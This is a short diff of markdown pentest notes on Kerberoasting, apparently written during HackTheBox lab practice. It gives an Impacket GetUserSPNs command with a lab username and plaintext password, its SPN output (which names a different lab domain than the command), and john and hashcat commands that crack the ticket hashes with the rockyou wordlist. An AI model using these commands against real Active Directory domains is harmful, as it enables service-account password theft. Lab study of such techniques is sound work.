@@ -29,7 +29,9 @@ ford.victoria
 ```
 # Kerberoasting
 SPN set on a user? we can ask the KDC for a TGS that contains their password and crack it offline 
+
 ```$ python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.11.174 'support.htb/support:Ironside437pleasure401Watchful'```
+
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
@@ -39,7 +41,7 @@ MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023
 ```
 Cracking the hash:
 ```
-john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
+$ john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 ```
 hashcat -a 0 -m 19600 kerberoastable.txt /usr/share/wordlists/rockyou.txt
